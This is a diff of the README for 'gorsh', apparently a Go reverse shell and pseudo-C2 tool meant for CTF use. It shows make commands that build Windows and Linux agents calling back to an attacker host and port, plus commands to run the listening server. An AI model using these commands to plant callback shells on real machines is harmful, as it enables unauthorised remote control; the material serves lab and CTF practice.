@@ -1,19 +1,15 @@
 # gorsh
 
-
-A toy CTF Golang Reverse Shell w/ a Tmux-driven psuedo-C2 Interface
-
+[go]lang [r]everse [sh]ell
 
 [![forthebadge](https://forthebadge.com/images/badges/fuck-it-ship-it.svg)](https://forthebadge.com)
+[![forthebadge](https://forthebadge.com/images/badges/made-with-go.svg)](https://forthebadge.com)
 [![forthebadge](https://forthebadge.com/images/badges/no-ragrets.svg)](https://forthebadge.com)
 [![forthebadge](https://forthebadge.com/images/badges/contains-technical-debt.svg)](https://forthebadge.com)
 [![forthebadge](https://forthebadge.com/images/badges/made-with-crayons.svg)](https://forthebadge.com)
 
-
 ![](https://i.imgur.com/x51XH6K.png)
 [![asciicast](https://asciinema.org/a/NmeC42TNu8BgdjMLcyVUXo74x.svg)](https://asciinema.org/a/NmeC42TNu8BgdjMLcyVUXo74x)
-
-
 
 
 
@@ -22,18 +18,36 @@ A toy CTF Golang Reverse Shell w/ a Tmux-driven psuedo-C2 Interface
 Generate agents with:
 
 ```bash
-# For the `make` targets, you only need the`LHOST`and`LPORT`environment variables.
-$ make {windows,macos,linux} LHOST=example.com LPORT=443
+# To `make` targets, set the `LHOST`and`LPORT`global variables.
+$ make windows LHOST=192.168.X.X LPORT=1234
+or
+$ make linux LHOST=192.168.X.X LPORT=1234
 ```
 
-Generate the server with:
+Generate & run the server with:
 
 ```bash
-# For the `make` targets, you only need the`LHOST`and`LPORT`environment variables.
-$ make server LPORT=443
+# To `make` a server with empty default values for listening parameters - allow the server parameters to be changed on the fly if needed
+$ make server
+
+#To run the server and set the interface on which to listen (--port is optional and set to 13000 by default)
+$ ./server --interface eth0 --port 1234
+
+#To run the server and set an IP address on which to listen (--port is optional and set to 13000 by default)
+$ ./server --host 192.168.X.X --port 1234
 ```
 
-Gen everything with `make all LHOST=example.com LPORT=443`
+or
+
+```bash
+# To `make` a server with static values for listening parameters - will not be changed on the fly even if ./server is run with --interface/--host/--port flags
+$ make server INTERFACE=eth0 LPORT=1234
+or
+$ make server LHOST=192.168.X.X LPORT=1234
+
+#To run the server
+$ ./server
+```
 
 ### Catching the shell
 
